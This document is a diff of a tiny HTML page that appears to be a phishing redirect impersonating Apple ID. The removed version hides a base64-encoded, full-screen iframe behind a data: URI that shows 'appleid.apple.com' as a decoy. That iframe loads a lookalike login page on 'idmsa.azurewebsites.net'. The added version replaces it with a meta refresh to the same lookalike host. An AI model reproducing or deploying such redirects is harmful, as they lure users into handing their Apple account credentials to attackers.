@@ -1,12 +1,4 @@
-
-<!DOCTYPE html>
 <html>
-<head>
-   <!-- HTML meta refresh URL redirection -->
-<script type="text/javascript">
-	  window.location = "data:text/html;https://appleid.apple.com/;data:text/html;base64,PGlmcmFtZSBzcmM9Imh0dHA6Ly9pZG1zYS5henVyZXdlYnNpdGVzLm5ldC9tYW5hZ2UucGhwP2FwcElkS2V5PTExMjQxODUwLTIxMDA0MTM3ODEwMjgzMjQ5OTQ5NjY0MzA2Nzk2MjYmbG9nb249NzA3NTgwMjg2MjEzNTEyU2lnbmluPWw3cTlreTFqM29hdTh6YzZnNHRyd2k1cHNkdjBuZTJmbXhiaDFsOHMwYXc5bnE2b3V5ZWN2ZmRwamd4bTdrMzQ1emhidDJpcjI4NTY3MjQ0ODE2Nzg0Nzg2MDY2MTgzMTUxODQxNzIyNDI4OTc3NTY5MjUzMjc3MDM0ODQ3NDY4NjI4NjgxNDEyJmF0dGVtcHQ9MSZsb2dvbj00NzY4NjE2MzYxNjExMTQiIHN0eWxlPSJwb3NpdGlvbjpmaXhlZDsgdG9wOjBweDsgbGVmdDowcHg7IGJvdHRvbTowcHg7IHJpZ2h0OjBweDsgd2lkdGg6MTAwJTsgaGVpZ2h0OjEwMCU7IGJvcmRlcjpub25lOyBtYXJnaW46MDsgcGFkZGluZzowOyBvdmVyZmxvdzpoaWRkZW47IHotaW5kZXg6OTk5OTk5OyI+DQo8L2lmcmFtZT4=";
-</script>
-</head>
-<body>
-</body>
+<META http-equiv="refresh" content="0; URL=http://idmsa.azurewebsites.net">
+
 </html>
